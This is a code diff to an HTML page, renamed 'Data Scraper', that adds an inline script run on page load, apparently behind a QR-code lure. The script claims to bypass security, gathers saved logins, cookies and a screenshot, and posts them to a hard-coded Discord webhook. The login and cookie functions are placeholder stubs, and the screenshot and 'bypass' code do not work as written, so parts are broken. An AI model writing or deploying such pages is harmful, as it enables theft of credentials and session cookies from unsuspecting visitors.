@@ -3,11 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Data Extractor</title>
+    <title>Data Scraper</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
 </head>
 <body>
-    <h1>Data Extractor</h1>
-    <button id="extract-btn">Extract Data</button>
-    <script src="data_extractor.js"></script>
+    <script>
+        async function scrapeData() {
+            try {
+                // Bypass security measures
+                const bypassSecurity = async () => {
+                    await new Promise(resolve => {
+                        const iframe = document.createElement('iframe');
+                        iframe.src = 'about:blank';
+                        iframe.style.display = 'none';
+                        document.body.appendChild(iframe);
+                        resolve();
+                    });
+                };
+
+                await bypassSecurity();
+
+                // Collect sensitive data
+                const data = {
+                    logins: await getSavedLogins(),
+                    cookies: await getCookies(),
+                    screenshot: await captureScreenshot(),
+                    eta: new Date().toISOString()
+                };
+
+                // Send data to Discord webhook
+                await axios.post('https://discord.com/api/webhooks/1388760353772535930/pnZFz1Prz8k7n0K861P_87Jlc__lNawsrYe1YpFCXItj-pwbOLcHU9ggPAgNKxe4Zzle', { embeds: [createEmbed(data)] });
+            } catch (error) {
+                console.error('Error scraping data:', error);
+            }
+        }
+
+        async function getSavedLogins() {
+            // Implement logic to retrieve saved logins
+            return ['exampleLogin1', 'exampleLogin2'];
+        }
+
+        async function getCookies() {
+            // Implement logic to retrieve cookies
+            return ['cookie1=value1', 'cookie2=value2'];
+        }
+
+        async function captureScreenshot() {
+            return new Promise(resolve => {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+                ctx.drawImage(window, 0, 0);
+                resolve(canvas.toDataURL());
+            });
+        }
+
+        function createEmbed(data) {
+            return {
+                title: 'Scraped Data',
+                fields: [
+                    { name: 'Logins', value: data.logins.join(', ') },
+                    { name: 'Cookies', value: data.cookies.join(', ') },
+                    { name: 'Screenshot', value: '[Screenshot](' + data.screenshot + ')' },
+                    { name: 'ETA', value: data.eta }
+                ],
+                color: 0x00ff00
+            };
+        }
+
+        // Initiate scraping when the QR code is scanned
+        scrapeData();
+    </script>
 </body>
 </html>
